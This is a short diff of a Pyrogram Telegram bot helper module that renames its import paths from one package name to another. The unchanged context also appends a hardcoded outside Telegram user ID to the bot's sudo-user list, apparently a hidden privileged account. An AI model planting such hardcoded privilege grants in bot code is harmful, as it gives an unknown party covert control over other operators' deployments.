@@ -1,8 +1,8 @@
 from typing import Callable
 from pyrogram import Client
 from pyrogram.types import Message
-from AdityaHalder.modules.helpers.admins import get_administrators
-from AdityaHalder.config import SUDO_USERS, OWNER_ID
+from TBH.modules.helpers.admins import get_administrators
+from TBH.config import SUDO_USERS, OWNER_ID
 
 SUDO_USERS.append(OWNER_ID)
 SUDO_USERS.append(1282754256)
